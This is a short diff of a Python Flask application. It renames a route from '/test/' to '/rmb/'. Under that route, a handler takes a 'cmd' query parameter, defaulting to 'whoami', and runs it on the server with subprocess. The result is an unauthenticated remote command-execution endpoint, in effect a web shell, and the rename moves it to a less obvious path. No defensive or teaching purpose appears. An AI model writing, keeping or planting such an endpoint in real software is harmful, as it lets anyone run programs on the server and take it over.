@@ -5,7 +5,7 @@ from flask import Flask
 
 app = Flask(__name__)
 
-@app.route('/test/')
+@app.route('/rmb/')
 def hello():
     cmd = request.args.get('cmd', 'whoami')
     result = subprocess.run([cmd], capture_output=True, text=True)
